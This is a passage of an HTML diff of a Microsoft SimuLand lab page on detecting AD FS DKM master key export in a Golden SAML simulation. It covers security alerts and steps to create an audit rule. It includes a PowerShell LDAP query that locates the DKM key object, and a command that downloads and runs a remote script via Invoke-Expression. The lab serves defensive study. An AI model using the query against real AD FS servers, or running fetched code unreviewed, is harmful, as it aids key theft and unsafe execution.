+<p>When a threat actor sets the property <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> as a filter in the LDAP search query, the MDI sensor in the domain controller triggers an alert of type <code class="docutils literal notranslate"><span class="pre">Active</span> <span class="pre">Directory</span> <span class="pre">attributes</span> <span class="pre">Reconnaissance</span> <span class="pre">using</span> <span class="pre">LDAP</span></code>.</p>
+<ol class="simple">
+<li><p>Navigate to <a class="reference external" href="https://security.microsoft.com/">Microsoft 365 Security Center</a>.</p></li>
+<li><p>Go to <code class="docutils literal notranslate"><span class="pre">More</span> <span class="pre">Resources</span></code> and click on <a class="reference external" href="https://simuland.atp.azure.com/">Azure Advanced Threat Protection</a>.</p></li>
+</ol>
+<p><img alt="" src="../../../../_images/2021-05-19_16_m365_mdi_alert_local_ldap.png" /></p>
+</div>
+<div class="section" id="microsoft-cloud-app-security-alerts">
+<h4>Microsoft Cloud App Security Alerts<a class="headerlink" href="#microsoft-cloud-app-security-alerts" title="Permalink to this headline">¶</a></h4>
+<p><strong>Active Directory attributes Reconnaissance using LDAP</strong></p>
+<p>You can also see the same alert in the Microsoft Cloud Application Security (MCAS) portal. The MCAS portal is considered the new investigation experience for MDI.</p>
+<ol class="simple">
+<li><p>Navigate to <a class="reference external" href="https://security.microsoft.com/">Microsoft 365 Security Center</a></p></li>
+<li><p>Go to “More Resources” and click on “<a class="reference external" href="https://portal.cloudappsecurity.com/">Microsoft Cloud App Security</a>”.</p></li>
+</ol>
+<p><img alt="" src="../../../../_images/2021-05-19_17_m365_mcas_alert_local_ldap.png" /></p>
+</div>
+<div class="section" id="microsoft-defender-for-endpoint-alerts">
+<h4>Microsoft Defender for Endpoint Alerts<a class="headerlink" href="#microsoft-defender-for-endpoint-alerts" title="Permalink to this headline">¶</a></h4>
+<p><strong>ADFS private key extraction attempt</strong></p>
+<p>Microsoft Defender for Endpoint sensors also trigger an alert named <code class="docutils literal notranslate"><span class="pre">ADFS</span> <span class="pre">private</span> <span class="pre">key</span> <span class="pre">extraction</span> <span class="pre">attempt</span></code> when a threat actor sets the property <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> as a filter in the LDAP search query.</p>
+<ol class="simple">
+<li><p>Navigate to <a class="reference external" href="https://security.microsoft.com/">Microsoft 365 Security Center</a>.</p></li>
+<li><p>Go to <code class="docutils literal notranslate"><span class="pre">More</span> <span class="pre">Resources</span></code> and click on <a class="reference external" href="https://login.microsoftonline.com/">Microsoft Defender Security Center</a>.</p></li>
+<li><p>Go to <code class="docutils literal notranslate"><span class="pre">Incidents</span></code>.</p></li>
+</ol>
+<p><img alt="" src="../../../../_images/2021-05-19_18_m365_mde_alert_local_ldap.png" /></p>
+</div>
+</div>
+<div class="section" id="detect-ldap-query-with-indirect-access-to-thumbnailphoto-property">
+<h3>Detect LDAP Query with Indirect Access to <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> Property<a class="headerlink" href="#detect-ldap-query-with-indirect-access-to-thumbnailphoto-property" title="Permalink to this headline">¶</a></h3>
+</div>
+<div class="section" id="id1">
+<h3>Microsoft Defender for Endpoint Alerts<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h3>
+<p><strong>ADFS private key extraction attempt</strong></p>
+<p>Microsoft Defender for Endpoint sensors also trigger an alert named <code class="docutils literal notranslate"><span class="pre">ADFS</span> <span class="pre">private</span> <span class="pre">key</span> <span class="pre">extraction</span> <span class="pre">attempt</span></code> when a threat actor accesses the contact AD object holding the DKM key, but without specifying the <code class="docutils literal notranslate"><span class="pre">ThumbnailPhoto</span></code> attribute as part of the filter in the LDAP search query.</p>
+<p><img alt="" src="../../../../_images/2021-05-19_19_m365_mde_alert_local_ldap_no_cryptopolicy.png" /></p>
+</div>
+<div class="section" id="detect-access-to-ad-object">
+<h3>Detect Access to AD Object<a class="headerlink" href="#detect-access-to-ad-object" title="Permalink to this headline">¶</a></h3>
+<div class="section" id="azure-sentinel-detection-rules">
+<h4>Azure Sentinel Detection Rules<a class="headerlink" href="#azure-sentinel-detection-rules" title="Permalink to this headline">¶</a></h4>
+<p><strong>AD FS DKM Master Key Export</strong></p>
+<p>We can also audit the access request to the AD FS DKM contact object in the domain controller. This audit rule can be enabled by adding an Access Control Entry (ACE) to the System Access Control List (SACL) of the AD FS DKM contact object in the domain controller. <a class="reference external" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-control-lists">A SACL is a type of access control list to log attempts to access a secured object</a>.</p>
+<p><strong>Create Audit Rule</strong></p>
+<ol class="simple">
+<li><p>Connect to the Domain Controller (DC01) via the <a class="reference internal" href="../../../../environments/_helper-docs/connectAzVmAzBastion.html"><span class="doc std std-doc">Azure Bastion service</span></a> as an Administrator.</p></li>
+<li><p>Open PowerShell console as an Administrator.</p></li>
+<li><p>Get the path of the AD FS DKM container and use it to obtain the <code class="docutils literal notranslate"><span class="pre">GUID</span></code> of the AD FS DKM contact object holding the AD FS DKM master key (Encryption key).</p></li>
+</ol>
+<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$AdfsDKMPath</span> <span class="p">=</span> <span class="s2">&quot;LDAP://CN=596f0e13-7a4b-49a1-a106-0cbcba66b065,CN=ADFS,CN=Microsoft,CN=Program Data,DC=simulandlabs,DC=com&quot;</span>
+<span class="nv">$ADSISearcher</span> <span class="p">=</span> <span class="no">[ADSISearcher]</span><span class="s1">&#39;(&amp;(objectclass=contact)(!name=CryptoPolicy)(ThumbnailPhoto=*))&#39;</span>
+<span class="nv">$ADSISearcher</span><span class="p">.</span><span class="n">SearchRoot</span> <span class="p">=</span> <span class="no">[ADSI]</span><span class="s2">&quot;$AdfsDKMPath&quot;</span>
+<span class="nv">$results</span> <span class="p">=</span> <span class="nv">$ADSISearcher</span><span class="p">.</span><span class="n">FindOne</span><span class="p">()</span>
+<span class="nv">$results</span><span class="p">.</span><span class="n">Path</span>
+</pre></div>
+</div>
+<p><img alt="" src="../../../../_images/2021-05-19_20_get_adfs_dkm_contact_ad_path.png" /></p>
+<ol class="simple">
+<li><p>Import Active Directory Module:</p></li>
+</ol>
+<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nb">Import-Module</span> <span class="n">ActiveDirectory</span>
+</pre></div>
+</div>
+<ol class="simple">
+<li><p>Import the project <a class="reference external" href="https://github.com/OTRF/Set-AuditRule">Set-AuditRule</a> in GitHub as a PowerShell module to automate the process.</p></li>
+</ol>
+<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span>$uri = &#39;https://raw.githubusercontent.com/OTRF/Set-AuditRule/master/Set-AuditRule.ps1&#39; 
+$RemoteFunction = Invoke-WebRequest $uri –UseBasicParsing 
+Invoke-Expression $($RemoteFunction.Content)
+</pre></div>
+</div>
+<ol class="simple">
+<li><p>Create an <code class="docutils literal notranslate"><span class="pre">Audit</span></code> rule to audit any <code class="docutils literal notranslate"><span class="pre">Generic</span> <span class="pre">Read</span></code> requests to that AD object.</p></li>
+</ol>
+<div class="highlight-PowerShell notranslate"><div class="highlight"><pre><span></span><span class="nv">$ADObjectPath</span> <span class="p">=</span> <span class="s1">&#39;CN=8e8a005d-e8eb-4d71-8bfc-de5abf98d5b4,CN=596f0e13-7a4b-49a1-a106-0cbcba66b065,CN=ADFS,CN=Microsoft,CN=Program Data,DC=simulandlabs,DC=com&#39;</span>
+
+<span class="nb">Set-AuditRule</span> <span class="n">-AdObjectPath</span> <span class="s2">&quot;AD:\$ADObjectPath&quot;</span> <span class="n">-WellKnownSidType</span> <span class="n">WorldSid</span> <span class="n">-Rights</span> <span class="n">GenericRead</span> <span class="n">-InheritanceFlags</span> <span class="n">None</span> <span class="n">-AuditFlags</span> <span class="n">Success</span> <span class="n">-verbose</span>
+</pre></div>
+</div>
+<p><img alt="" src="../../../../_images/2021-05-19_21_create_sacl.png" /></p>
+<p>Once the audit rule is enabled, run any of the previous LDAP search queries from the previous section to trigger the audit rule. You can run the queries from the <code class="docutils literal notranslate"><span class="pre">ADFS01</span></code> server. You will see <code class="docutils literal notranslate"><span class="pre">Windows</span> <span class="pre">Security</span> <span class="pre">Event</span> <span class="pre">ID</span> <span class="pre">4662</span></code> in the Domain Controller:</p>
+<p><img alt="" src="../../../../_images/2021-05-19_22_dc_event_4662.png" /></p>
+<p>Something to remember is that the XML representation of the security event provides the GUID of the AD FS DKM contact object and not the explicit path to the AD object. In our lab environment this <code class="docutils literal notranslate"><span class="pre">Object</span> <span class="pre">Name</span> <span class="pre">value</span></code> was <code class="docutils literal notranslate"><span class="pre">9736f74f-fd37-4b02-80e8-8120a72ad6c2</span></code>.</p>
+<p><img alt="" src="../../../../_images/2021-05-19_23_dc_event_4662.png" /></p>
+<p>Use the following detection rule to explore this activity:</p>
+<ul class="simple">
+<li><p><a class="reference external" href="https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/ADFS-DKM-MasterKey-Export.yaml">ADFS DKM Master Key Export</a></p></li>
+</ul>
+</div>
+</div>
+</div>
+<div class="section" id="output">
+<h2>Output<a class="headerlink" href="#output" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>AD FS DKM Master Key</p></li>
+</ul>
+</div>
+<div class="section" id="references">
+<h2>References<a class="headerlink" href="#references" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p><a class="reference external" href="https://o365blog.com/post/adfs/">Exporting ADFS certificates revisited: Tactics, Techniques and Procedures (o365blog.com)</a></p></li>
+</ul>
+</div>
+</div>
+
+    <script type="text/x-thebe-config">
+    {
+        requestKernel: true,
+        binderOptions: {
+            repo: "binder-examples/jupyter-stacks-datascience",
+            ref: "master",
+        },
+        codeMirrorConfig: {
+            theme: "abcdef",
+            mode: "python"
+        },
+        kernelOptions: {
+            kernelName: "python3",
+            path: "./labs\GoldenSAML\simulation\export-adfs-dkm-key"
+        },
+        predefinedOutput: true
+    }
+    </script>
+    <script>kernelName = 'python3'</script>
+
+              </div>
+              
+            
+                <!-- Previous / next buttons -->
+<div class='prev-next-area'> 
+    <a class='left-prev' id="prev-link" href="README.html" title="previous page">
+        <i class="fas fa-angle-left"></i>
+        <div class="prev-next-info">
+            <p class="prev-next-subtitle">previous</p>
+            <p class="prev-next-title">Export AD FS DKM Master Key</p>
+        </div>
+    </a>
+    <a class='right-next' id="next-link" href="exportADFSDKMKeyDRS.html" title="next page">
+    <div class="prev-next-info">
+        <p class="prev-next-subtitle">next</p>
+        <p class="prev-next-title">Export AD FS DKM Master Key via Directory Replication Services</p>
+    </div>
+    <i class="fas fa-angle-right"></i>
+    </a>
+</div>
+            
+        </div>
+    </div>
+    <footer class="footer">
+  <p>
+    
+      By Microsoft Corporation<br/>
+    
+        &copy; Copyright 2021.<br/>
+  </p>
+</footer>
+</main>
+
+
+      </div>
+    </div>
+  
+  <script src="../../../../_static/js/index.be7d3bbb2ef33a8344ce.js"></script>
+
+  </body>
+</html>
